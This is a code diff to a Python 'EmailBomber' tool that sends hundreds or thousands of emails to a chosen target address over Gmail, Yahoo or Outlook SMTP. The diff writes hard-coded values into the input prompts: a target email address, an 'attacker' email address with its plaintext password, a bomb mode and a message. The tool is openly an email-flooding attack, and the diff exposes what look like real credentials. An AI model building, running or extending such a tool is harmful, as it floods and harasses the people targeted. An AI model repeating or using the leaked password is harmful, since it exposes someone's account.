@@ -37,9 +37,9 @@ class EmailBomber:
         self.amount = None
         try:
             print(bColors.BLUE + '\n[+] Initializing bomber ...')
-            self.target = str(input(bColors.GREEN + '[:] Enter Target Email > '))
+            self.target = str(input(bColors.GREEN + '[:] Enter Target Email > wylma0145@gmail.com'))
             self.mode = int(input(bColors.GREEN + '[:] Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:('
-                                                  'custom) > '))
+                                                  'custom) > 4'))
 
             if int(self.mode) > int(4) or int(self.mode) < int(1):
                 print(bColors.RED + '[-] ERROR: Invalid Option!')
@@ -60,7 +60,7 @@ class EmailBomber:
             elif self.mode == int(3):
                 self.amount = int(250)
             else:
-                self.amount = int(input(bColors.GREEN + '[:] Choose a CUSTOM amount > '))
+                self.amount = int(input(bColors.GREEN + '[:] Choose a CUSTOM amount > 50'))
             print(bColors.GREEN + f'[+] You have selected BOMB mode {self.mode} and {self.amount} emails')
 
         except Exception as e:
@@ -71,7 +71,7 @@ class EmailBomber:
         try:
             print(bColors.BLUE + '\n[+] Setting up email ...')
             self.server = str(input(bColors.GREEN + '[:] Enter email server | or select premade options - 1:Gmail '
-                                                    '2:Yahoo 3:Outlook 4:Custom > '))
+                                                    '2:Yahoo 3:Outlook 4:Custom > 1'))
             defaultPort = True
 
             if self.server == '4':
@@ -88,10 +88,10 @@ class EmailBomber:
             elif self.server == '3':
                 self.server = 'smtp-mail.outlook.com'
 
-            self.fromAddr = str(input(bColors.GREEN + '[:] Enter attacker email address > '))
-            self.fromPwd = str(input(bColors.GREEN + '[:] Enter attacker password > '))
-            self.subject = str(input(bColors.GREEN + '[:] Enter subject > '))
-            self.message = str(input(bColors.GREEN + '[:] Enter message > '))
+            self.fromAddr = str(input(bColors.GREEN + '[:] Enter attacker email address > wimmatir@gmail.com'))
+            self.fromPwd = str(input(bColors.GREEN + '[:] Enter attacker password > Grindsman77!'))
+            self.subject = str(input(bColors.GREEN + '[:] Enter subject > This is an example email'))
+            self.message = str(input(bColors.GREEN + '[:] Enter message > Bro, y3 bombi'))
 
             if self.target == self.fromAddr:
                 print(bColors.RED + '\n[-] ERROR: Can\'t have same Attacker and Target address.')
